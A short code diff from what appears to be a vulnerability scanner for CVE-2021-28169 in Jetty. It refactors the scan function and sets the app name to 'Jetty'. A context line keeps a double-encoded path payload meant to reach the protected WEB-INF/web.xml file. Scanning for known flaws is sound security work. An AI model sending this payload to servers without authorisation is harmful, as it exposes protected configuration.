@@ -7,12 +7,12 @@ cve_2021_28169_payloads = [
     {'path': '?/%2557EB-INF/web.xml'},
 ]
 
-def cve_2021_28169_scan(self, clients):
+def cve_2021_28169_scan(clients):
     ''' 在版本9.4.40、10.0.2、11.0.2 之前, ConcatServlet和WelcomeFilterJetty Servlet中的类受到"双重解码"错误的影响 '''
     client = clients.get('reqClient')
     
     vul_info = {
-        'app_name': self.app_name,
+        'app_name': 'Jetty',
         'vul_type': 'DSinfo',
         'vul_id': 'CVE-2021-28169',
     }
